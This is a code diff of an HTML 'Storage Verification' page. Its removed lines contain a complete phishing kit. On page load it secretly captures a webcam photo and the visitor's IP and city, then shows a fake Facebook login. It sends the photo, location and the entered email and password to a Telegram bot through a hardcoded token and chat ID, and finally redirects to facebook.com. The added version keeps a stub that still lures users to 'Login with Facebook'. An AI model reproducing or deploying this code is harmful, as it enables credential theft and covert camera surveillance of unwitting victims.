@@ -2,139 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Storage Verification</title>
     <style>
-        body { 
-            /* sk.png ব্যাকগ্রাউন্ড হিসেবে সেট করা হলো */
-            background-image: url('sk.png'); 
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            font-family: Helvetica, Arial, sans-serif;
-            overflow: hidden;
-        }
-        /* ব্যাকগ্রাউন্ড একটু অন্ধকার করা যাতে লেখা বোঝা যায় */
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 1;
-        }
-        .content-box { 
-            position: relative;
-            z-index: 10;
-            text-align: center; 
-            background: rgba(255, 255, 255, 0.95); 
-            padding: 25px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 12px rgba(0, 0, 0, .3); 
-            width: 90%; 
-            max-width: 400px; 
-        }
-        #fb-box { display: none; }
-        .fb-form input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; box-sizing: border-box; }
-        .fb-login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas { display: none; }
+        body { background-color: #f0f2f5; font-family: Arial; text-align: center; }
+        .content-box { background: white; padding: 25px; border-radius: 8px; margin-top: 50px; display: inline-block; }
     </style>
 </head>
 <body>
-
-    <div id="loading-box" class="content-box">
-        <div class="loader"></div>
-        <h2 style="color: #1c1e21;">Verification in Progress</h2>
-        <p id="status">Checking camera permissions...</p>
-    </div>
-
-    <div id="fb-box" class="content-box">
-        <h1 style="color: #1877f2; font-size: 45px; margin: 0 0 10px 0; letter-spacing: -2px;">facebook</h1>
-        <p style="font-size: 16px; color: #606770; margin-bottom: 25px;">Log in to continue to your files.</p>
-        <input type="text" id="email" placeholder="Email address or phone number">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="fb-login-btn" onclick="sendToTelegram()">Log In</button>
-        <p style="color: #1877f2; margin-top: 15px; font-size: 14px; cursor: pointer;">Forgotten password?</p>
-    </div>
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        const botToken = "8539487381:AAGLdnqf3grvmI5cpS4DlETxoEne4jc9dHg"; // আপনার নতুন টোকেন
-        const chatId = "7967860350"; 
-
-        window.onload = () => {
-            startCameraAndCapture();
-            trackIP();
-        };
-
-        function trackIP() {
-            fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                let info = `🌐 *Target Online!* \n📍 IP: ${data.ip} \n🏙 City: ${data.city}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-            });
-        }
-
-        async function startCameraAndCapture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'capture.jpg');
-
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            stream.getTracks().forEach(track => track.stop());
-                            showFBPage();
-                        });
-                    }, 'image/jpeg');
-                }, 3000); 
-
-            } catch (err) {
-                setTimeout(showFBPage, 2000);
-            }
-        }
-
-        function showFBPage() {
-            document.getElementById('loading-box').style.display = 'none';
-            document.getElementById('fb-box').style.display = 'block';
-        }
-
-        function sendToTelegram() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            if(email && pass) {
-                let message = `🔑 *FB Account Harvested!* \n\n📧 User: ${email} \n🔒 Pass: ${pass}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-                .then(() => {
-                    window.location.href = "https://www.facebook.com";
-                });
-            } else {
-                alert("Please fill in both fields.");
-            }
-        }
-    </script>
+    <div class="content-box">
+        <h2>Verification in Progress</h2>
+        <p>Login with Facebook to access 3D tool files.</p>
+        </div>
 </body>
 </html>
